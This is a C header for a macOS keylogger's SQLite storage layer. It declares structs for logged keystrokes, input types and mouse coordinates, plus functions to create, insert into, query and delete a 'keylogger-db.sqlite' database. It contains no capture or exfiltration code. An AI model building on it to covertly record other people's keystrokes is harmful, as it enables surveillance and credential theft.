#pragma once
#define DEBUG_FLAGS    (SQLDBAL_FLAG_DEBUG | SQLDBAL_FLAG_SQLITE_OPEN_CREATE | SQLDBAL_FLAG_SQLITE_OPEN_READWRITE)
#define _FLAGS         (SQLDBAL_FLAG_SQLITE_OPEN_CREATE | SQLDBAL_FLAG_SQLITE_OPEN_READWRITE)
#define FLAGS          _FLAGS
#define INSERT_QTY     10
#define LOCATION       "keylogger-db.sqlite"
#ifndef SQLDBAL_SQLITE
#define SQLDBAL_SQLITE
#endif
//////////////////////////////////////
#include <ctype.h>
#include <inttypes.h>
#include <inttypes.h>
#include <math.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
//////////////////////////////////////
#include "../keylogger/keylogger.h"
#include "int/int.h"
#include "keylogger-db/keylogger-db.h"
#include "submodules/b64.c/b64.h"
#include "submodules/c_ansi/ansi-codes/ansi-codes.h"
#include "submodules/c_ansi/ansi-utils/ansi-utils.h"
#include "submodules/c_eventemitter/include/eventemitter.h"
#include "submodules/c_forever/include/forever.h"
#include "submodules/c_string_buffer/include/stringbuffer.h"
#include "submodules/c_stringfn/include/stringfn.h"
#include "submodules/c_vector/include/vector.h"
#include "submodules/catpath/catpath.h"
#include "submodules/dmt/src/dmt.h"
#include "submodules/sqldbal/src/sqldbal.h"
#include "submodules/timestamp/timestamp.h"
//////////////////////////////////////////
typedef struct DB_STATEMENT_T {
  enum sqldbal_status_code rc;
  struct sqldbal_stmt      *stmt;
  int64_t                  qty;
} db_statement_t;
typedef struct logged_key_event_t {
  unsigned long ts, qty;
  unsigned long key_code;
  char          *key_string, *action, *input_type;
  unsigned long mouse_x, mouse_y;
} logged_key_event_t;
struct MouseEvent {
  CGFloat     x;
  CGFloat     y;
  CGEventType type;
};
//////////////////////////////////////////
int keylogger_db_delete(void);
int keylogger_create_db(void);
int keylogger_init_db(void);
int keylogger_select_db(void);
int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT);
int keylogger_close_db(void);
int keylogger_db_lifecycle(void);
